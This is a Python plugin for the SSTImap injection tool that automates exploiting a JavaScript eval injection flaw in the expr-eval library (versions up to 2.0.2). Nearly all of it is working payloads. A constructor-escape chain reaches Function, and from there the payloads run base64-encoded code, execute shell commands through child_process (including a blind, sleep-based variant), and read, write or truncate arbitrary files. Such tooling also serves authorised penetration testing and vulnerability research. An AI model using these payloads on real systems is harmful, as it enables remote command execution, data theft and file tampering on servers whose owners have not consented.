from plugins.languages import javascript
from utils import rand

# TODO: process.mainModule may be undefined, needs replacement
class Expr_eval(javascript.Javascript):
    extra_plugin = True
    priority = 6
    header_type = 'add'
    sstimap_version = '1.2.3'
    plugin_info = {
        "Description": """expr-eval <= 2.0.2 RCE via JavaScript eval""",
        "Usage notes": """expr-eval up to the latest version 2.0.2 is vulnerable to JavaScript eval injection.
Plugin automates detection and exploitation of this flaw providing post-exploitation capabilities.""",
        "Authors": [
            "@yoshino-s https://github.com/yoshino-s/",  # Vulnerability discovery
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Plugin for SSTImap
        ],
        "References": [
            #"CVE: not assigned yet",
            "Writeup: https://huntr.com/bounties/1-npm-expr-eval",
        ]
    }

    def init(self):
        self.update_actions({
            'render': {
                'header': """Object = constructor; a() = 7*7; d = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(a), 'constructor'); c=d.value; f=c("return ''+({header[0]}+{header[1]})+""",
                'trailer': """+({trailer[0]}+{trailer[1]});"); f()""",
                'render': '{code}',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """Object = constructor; a() = 7*7; d = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(a), 'constructor'); c=d.value; f=c("return process.mainModule.require(''+({header[0]}+{header[1]})+""",
                'trailer': """+({trailer[0]}+{trailer[1]}));"); f()""",
                'render': '{code}',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'evaluate': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """process.mainModule.require('os').platform()"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """Object = constructor; a() = 7*7; d = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(a), 'constructor'); c=d.value; f=c("[''][0+!eval(Buffer('{code_b64p}', 'base64').toString())]['length']"); f()"""
            },
            'execute': {
                'execute': """process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'execute_blind': """Object = constructor; a() = 7*7; d = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(a), 'constructor'); c=d.value; f=c("process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"); f()"""
            },
            'write': {
                'write': """process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                'truncate': """process.mainModule.require('fs').writeFileSync('{path}', '')"""
            },
            'read': {
                'read': """process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': """process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
        })

        self.set_contexts([
            # Plain expression context
            {'level': 0},
            # Expression part context
            {'level': 1, 'prefix': '{closure};', 'suffix': ';', 'closures': javascript.ctx_closures},
        ])
